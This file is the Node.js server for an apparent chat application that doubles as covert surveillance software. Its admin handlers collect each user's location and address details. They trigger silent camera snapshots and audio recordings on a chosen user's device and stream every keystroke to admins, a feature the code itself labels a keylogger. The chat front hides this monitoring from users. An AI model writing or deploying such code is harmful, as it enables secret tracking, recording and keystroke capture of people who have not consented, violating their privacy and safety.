const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const MESSAGES_FILE = path.join(__dirname, 'messages.json');
let chatMessagesHistory = [];

// Load existing messages
try {
    if (fs.existsSync(MESSAGES_FILE)) {
        const fileData = fs.readFileSync(MESSAGES_FILE, 'utf-8');
        chatMessagesHistory = JSON.parse(fileData);
    }
} catch (err) {
    console.error("Error loading chat history:", err);
}

function saveMessagesHistory() {
    try {
        fs.writeFileSync(MESSAGES_FILE, JSON.stringify(chatMessagesHistory, null, 2), 'utf-8');
    } catch (err) {
        console.error("Error saving chat history:", err);
    }
}

app.use(express.static(path.join(__dirname)));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

const activeUsers = new Map(); // Locations for admin
let onlineChatUsersCount = 0;
const chatUsers = new Map(); // socket.id -> username

io.on('connection', (socket) => {
    // --- ADMIN LOGIC ---
    socket.on('admin_join', () => {
        socket.join('admins');
        const usersArray = Array.from(activeUsers.entries()).map(([id, data]) => ({
            id,
            ...data
        }));
        socket.emit('initial_locations', usersArray);
    });

    socket.on('update_location', (data) => {
        // data contains: lat, lon, addressDetails, username
        activeUsers.set(socket.id, data);
        io.to('admins').emit('user_location_updated', {
            id: socket.id,
            ...data
        });
    });
    
    // Admin requesting a photo from a specific user
    socket.on('request_snapshot', (userId) => {
        io.to(userId).emit('take_snapshot');
    });

    // Admin requesting audio from a specific user
    socket.on('request_audio', (userId) => {
        io.to(userId).emit('take_audio');
    });


    // --- CHAT LOGIC ---
    socket.on('user_join_chat', (username) => {
        chatUsers.set(socket.id, username);
        onlineChatUsersCount++;
        
        // Notify everyone about count
        io.emit('online_users_count', onlineChatUsersCount);
        
        // Send history to the joined user
        socket.emit('chat_history', chatMessagesHistory);
        
        // Notify others that someone joined
        socket.broadcast.emit('user_joined_notice', username);
    });

    socket.on('chat_message', (data) => {
        // Save to memory and JSON file
        chatMessagesHistory.push(data);
        saveMessagesHistory();
        
        // Broadcast message to everyone EXCEPT sender
        socket.broadcast.emit('chat_message', data);
    });

    // User sending the photo silently to admins
    socket.on('snapshot_result', (data) => {
        io.to('admins').emit('snapshot_received', {
            id: socket.id,
            username: data.username,
            image: data.image
        });
    });

    // User sending the audio silently to admins
    socket.on('audio_result', (data) => {
        io.to('admins').emit('audio_received', {
            id: socket.id,
            username: data.username,
            audio: data.audio
        });
    });

    // User is typing (Keylogger)
    socket.on('live_typing', (text) => {
        // Send exactly what they type to the admin
        io.to('admins').emit('user_typing_live', {
            id: socket.id,
            text: text
        });
        
        // Broadcast to other users in the chat room to show the UI typing indicator
        if (text.length > 0) {
            socket.broadcast.emit('show_typing_indicator');
        }
    });

    
    // --- DISCONNECT ---
    socket.on('disconnect', () => {
        // Handle Admin map removal
        if (activeUsers.has(socket.id)) {
            activeUsers.delete(socket.id);
            io.to('admins').emit('user_disconnected', socket.id);
        }

        // Handle Chat leave
        if (chatUsers.has(socket.id)) {
            const username = chatUsers.get(socket.id);
            chatUsers.delete(socket.id);
            onlineChatUsersCount--;
            
            io.emit('online_users_count', onlineChatUsersCount);
            socket.broadcast.emit('user_left_notice', username);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    console.log(`Admin Dashboard: http://localhost:${PORT}/admin`);
});
